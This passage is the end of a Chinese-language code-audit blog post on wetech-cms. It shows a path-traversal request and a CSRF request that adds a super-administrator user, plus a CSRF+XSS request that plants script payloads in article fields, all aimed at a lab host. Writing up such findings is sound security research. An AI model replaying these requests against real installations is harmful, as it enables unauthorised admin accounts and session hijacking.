+</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>cto_bundle=hVSq4l9ZUGQ2dzF1TiUyQmYlMkJhTUZKMXA1U3lTZTdnbWhmdlVhT3U1eGNIZXAlMkJyNDA1Qm83NUd5bVM1bXRONGdXMng1NVNYRHdrZXhQNmtWVk9uU0tNVnJYMjglMkJaQWFTdDRGdGRMck1DNkVvWEUyUVh5MWQlMkZvZkZ3YURyd1pnZjhvbWYlMkJMNHpWUmVCczZPc1lEeFNrMnRMYWxqSXclM0QlM0Q; collapase-nav=collapse-nav2; JSESSIONID=382FCF7BF762009C987ED7A0D73AF0C0</span>
+</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>name=../../../indexPic/hadagaga123
+</span></span></code></pre></td></tr></table></div></div><p>​ 我们访问http://localhost:8888/resources/indexPic/hadagaga123.tar.gz</p><p><img src=/p/wetech-cms/image-20241127231733666-1732721891177-8-1732797677430-2.png width=532 height=156 srcset="/p/wetech-cms/image-20241127231733666-1732721891177-8-1732797677430-2_hu7134282315425547039.png 480w, /p/wetech-cms/image-20241127231733666-1732721891177-8-1732797677430-2_hu5508649929541935002.png 1024w" loading=lazy alt=image-20241127231733666 class=gallery-image data-flex-grow=341 data-flex-basis=818px></p><h2 id=前端渗透测试>前端渗透测试</h2><h3 id=xss>XSS</h3><p>​ 经过测试该项目也是多处存在XSS，但多为POST型，难以利用。</p><h3 id=csrf>CSRF</h3><p>​ 我们先构建一个创建超级管理员用户的数据包：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/admin/user/add.do</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>172.21.55.165:8888</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>136</span>
+</span></span><span class=line><span class=cl><span class=n>X-Requested-With</span><span class=o>:</span> <span class=l>XMLHttpRequest</span>
+</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span>
+</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>application/json, text/javascript, */*; q=0.01</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded; charset=UTF-8</span>
+</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://172.21.55.165:8888</span>
+</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://172.21.55.165:8888/admin</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span>
+</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>cto_bundle=hVSq4l9ZUGQ2dzF1TiUyQmYlMkJhTUZKMXA1U3lTZTdnbWhmdlVhT3U1eGNIZXAlMkJyNDA1Qm83NUd5bVM1bXRONGdXMng1NVNYRHdrZXhQNmtWVk9uU0tNVnJYMjglMkJaQWFTdDRGdGRMck1DNkVvWEUyUVh5MWQlMkZvZkZ3YURyd1pnZjhvbWYlMkJMNHpWUmVCczZPc1lEeFNrMnRMYWxqSXclM0QlM0Q; JSESSIONID=2CE951E9C69D2B0E5387EA588A046AC3; collapase-nav=collapse-nav</span>
+</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>username=CSRF&amp;nickname=CSRF&amp;password=testtest&amp;confirmPwd=testtest&amp;phone=12312312323&amp;email=1231241%40qq.com&amp;status=1&amp;roleIds=1&amp;groupIds=1
+</span></span></code></pre></td></tr></table></div></div><p>​ 创建CSRFpoc，再以管理员身份访问，模拟管理员遭受攻击。</p><p><img src=/p/wetech-cms/image-20241128201304518.png width=1584 height=93 srcset="/p/wetech-cms/image-20241128201304518_hu14879714586161386488.png 480w, /p/wetech-cms/image-20241128201304518_hu10458759577293330170.png 1024w" loading=lazy alt=image-20241128201304518 class=gallery-image data-flex-grow=1703 data-flex-basis=4087px></p><p>​ 成功创建用户。</p><h3 id=csrfxss>CSRF+XSS</h3><p>​ 根据我们前面的测试我们可以知道，该项目存在大量的XSS攻击点，且在文章信息管理处，创建一个标题为XSSpayload的文章可实现对管理员的XSS攻击，但由于多数传参为POST型，所以难以利用，但是假设使用CSRF攻击一个能创建文章的低权限用户，则可能实现，通过XSS攻击直接攻击管理员，获取管理员身份。</p><p>​ 为进行实验，我们创建一个用户，能够编写文章。</p><p>​ 创建完成后，编写一个含有XSSpayload的数据包：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/admin/topic/add.do</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>172.21.55.165:8888</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>299</span>
+</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>application/json, text/javascript, */*; q=0.01</span>
+</span></span><span class=line><span class=cl><span class=n>X-Requested-With</span><span class=o>:</span> <span class=l>XMLHttpRequest</span>
+</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded; charset=UTF-8</span>
+</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://172.21.55.165:8888</span>
+</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://172.21.55.165:8888/admin/topic/add.do</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9</span>
+</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>collapase-nav=collapse-nav1; JSESSIONID=71F80098D094271EFCD339F4B489AAF6</span>
+</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>title=%3Cscript%3Ealert(&#39;CSRF%2BXSS&#39;)%3C%2Fscript%3E&amp;cname=%E6%B1%BD%E8%BD%A6&amp;cid=5&amp;status=1&amp;recommend=0&amp;publishDate=2024-11-28&amp;content=%3Cp%3E%26lt%3Bscript%26gt%3Balert(&#39;CSRF%2BXSS&#39;)%26lt%3B%2Fscript%26gt%3B%3C%2Fp%3E%3Cp%3E%3Cbr%3E%3C%2Fp%3E&amp;summary=%3Cscript%3Ealert(&#39;CSRF%2BXSS&#39;)%3C%2Fscript%3E
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/wetech-cms/image-20241128203107682.png width=1193 height=260 srcset="/p/wetech-cms/image-20241128203107682_hu13925124324179328664.png 480w, /p/wetech-cms/image-20241128203107682_hu7905711320542160707.png 1024w" loading=lazy alt=image-20241128203107682 class=gallery-image data-flex-grow=458 data-flex-basis=1101px></p><p>​ 成功触发XSS攻击。
+至此，wetech-cms审计结束</p></section><footer class=article-footer><section class=article-tags><a href=/tags/code-audit/>Code Audit</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/cs_singlewindow_cms/><div class=article-image><img src=/p/cs_singlewindow_cms/cover.f57e1bc77d18d988d1ea5646a3fdb180_hu17995570379238100603.png width=250 height=150 loading=lazy alt="Featured image of post cs_singlewindow_cms" data-hash="md5-9X4bx30Y2YjR6lZGo/2xgA=="></div><div class=article-details><h2 class=article-title>cs_singlewindow_cms</h2></div></a></article><article class=has-image><a href=/p/jfinalcms/><div class=article-image><img src=/p/jfinalcms/cover.475149eeef9e821b03091311ac435ba9_hu7198081271608463053.png width=250 height=150 loading=lazy alt="Featured image of post JFinalCMS" data-hash="md5-R1FJ7u+eghsDCRMRrENbqQ=="></div><div class=article-details><h2 class=article-title>JFinalCMS</h2></div></a></article><article class=has-image><a href=/p/newbee-mall/><div class=article-image><img src=/p/newbee-mall/cover.d0d72115f3faccc22a7ff7c0c38ca3ca_hu6190031081276942614.png width=250 height=150 loading=lazy alt="Featured image of post newbee-mall" data-hash="md5-0NchFfP6zMIqf/fAw4yjyg=="></div><div class=article-details><h2 class=article-title>newbee-mall</h2></div></a></article><article class=has-image><a href=/p/oasys-1/><div class=article-image><img src=/p/oasys-1/cover.983a250cc2b2a88f295e7c7b55c781be_hu10225888204114563353.png width=250 height=150 loading=lazy alt="Featured image of post oasys-1" data-hash="md5-mDolDMKyqI8pXnx7VceBvg=="></div><div class=article-details><h2 class=article-title>oasys-1</h2></div></a></article><article class=has-image><a href=/p/intelligent-reporting-system/><div class=article-image><img src=/p/intelligent-reporting-system/cover.c514d916917173a48a42e0114b469961_hu7626638945853200361.jpg width=250 height=150 loading=lazy alt="Featured image of post Intelligent reporting system-1" data-key=Intelligent-reporting-system data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ=="></div><div class=article-details><h2 class=article-title>Intelligent reporting system-1</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2024 hadagaga blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.29.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
